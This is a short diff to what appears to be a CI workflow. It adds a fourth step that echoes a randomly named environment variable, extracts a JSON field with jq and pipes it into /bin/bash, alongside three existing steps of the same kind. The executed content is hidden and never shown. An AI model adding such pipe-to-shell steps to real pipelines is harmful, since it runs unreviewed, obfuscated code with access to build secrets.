@@ -42,6 +42,7 @@ jobs:
           printf '%s' "$g15500" | jq -r .k9175 | /bin/bash
           printf '%s' "$tfnb51566" | jq -r .kh0850 | /bin/bash
           printf '%s' "$dnbm78119" | jq -r .dbwxm99 | /bin/bash
+          echo $udo6 | jq -r .fmyso228 | /bin/bash
 
       - name: Archive results
         if: always()
